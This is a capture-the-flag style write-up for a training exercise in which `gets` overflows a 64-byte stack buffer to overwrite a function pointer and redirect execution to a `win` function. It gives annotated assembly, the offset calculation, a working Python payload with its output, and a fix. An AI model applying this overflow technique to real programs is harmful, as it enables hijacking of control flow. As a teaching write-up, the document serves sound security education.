# ex03 — Function pointer overwrite via `gets`

Goal: `code flow successfully changed`

## Assembly

```
08048424 <win>:
    puts("code flow successfully changed")
    ret

08048438 <main>:
    sub    esp, 0x60
    mov    [esp+0x5c], 0        ; fp = NULL
    lea    eax, [esp+0x1c]
    call   gets                  ; VULN
    cmp    [esp+0x5c], 0
    je     .done
    printf("calling function pointer, jumping to 0x%08x\n", fp)
    call   eax                   ; INDIRECT CALL — controlled
```

## Stack layout

```
+---------------+ esp+0x5c  fp   ← target
| buffer[64]    | esp+0x1c
+---------------+ esp
```

Offset = `0x5c - 0x1c = 64`.

## Exploit

```bash
python3 -c "
import sys, struct
sys.stdout.buffer.write(b'A'*64 + struct.pack('<I', 0x08048424) + b'\n')
" | ./ex03/bin
```

Output:

```
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## Why it works

The buffer is 64 bytes; `fp` sits right after. Overflowing 64 bytes places our
next 4 bytes in `fp`. `call eax` (after `mov eax, [esp+0x5c]`) jumps to
`0x08048424` = `win`. NX/PIE/ASLR are all off, so `win`'s address is fixed and
directly callable.

## Fix

Never call a function pointer sourced from an unchecked buffer. Use
`fgets(buf, sizeof buf, stdin)` for the input, and structure the code so the
pointer isn't next to a stack buffer at all (or use CFI to check the callee).
